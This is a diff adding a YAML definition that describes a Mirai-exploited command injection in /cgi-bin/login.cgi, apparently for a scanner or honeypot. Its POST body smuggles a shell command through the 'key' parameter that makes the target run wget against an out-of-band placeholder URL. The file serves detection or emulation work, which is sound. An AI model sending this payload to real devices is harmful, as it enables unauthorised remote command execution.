@@ -1,0 +1,32 @@
+id: mirai-unknown-rce
+info:
+  name: Mirai - Remote Command Injection
+  author: gy741
+  description: 'Mirai is susceptible to an unknown exploit that targets the login
+    CGI script, where a key parameter is not properly sanitized leading to a command
+    injection vulnerability.
+
+    '
+  severity: critical
+  reference:
+  - https://www.fortinet.com/blog/threat-research/the-ghosts-of-mirai
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cwe-id: CWE-77
+  metadata:
+    max-request: 1
+  tags: mirai,rce,oast
+traps:
+- request:
+    method: POST
+    path: /cgi-bin/login.cgi
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: 'key='';`wget http://{{interactsh-url}}`;#
+
+      '
+  response:
+    status_code: 200
+    headers: {}
+    body: ''
